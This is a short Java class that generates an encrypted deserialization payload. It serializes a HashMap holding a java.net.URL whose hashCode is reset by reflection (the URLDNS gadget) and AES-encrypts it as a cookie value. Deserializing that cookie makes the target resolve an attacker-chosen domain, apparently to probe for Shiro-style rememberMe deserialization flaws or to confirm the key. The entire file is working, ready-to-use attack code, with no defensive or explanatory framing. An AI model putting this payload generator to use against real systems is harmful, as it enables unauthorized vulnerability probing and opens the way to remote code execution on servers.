package com.core;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class GeneratePayload {
	public static String generate(String domain,String key){
		String cookie=null;
		try{
			HashMap<URL,String> map=new HashMap<URL, String>();
			URL url=new URL(domain);
			Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
			f.setAccessible(true);
			f.set(url,0xdeadbeef);
			map.put(url, "rmb122");
			f.set(url,-1);
			ByteArrayOutputStream baos=new ByteArrayOutputStream();
			ObjectOutputStream oos=new ObjectOutputStream(baos);
			oos.writeObject(map);
			byte[] bytes=baos.toByteArray();
			cookie=AesCrypt.encrypt(key, bytes);
			baos.close();
			oos.close();
		}catch(Exception e){
			cookie="";
		}
		return cookie;
	}
}
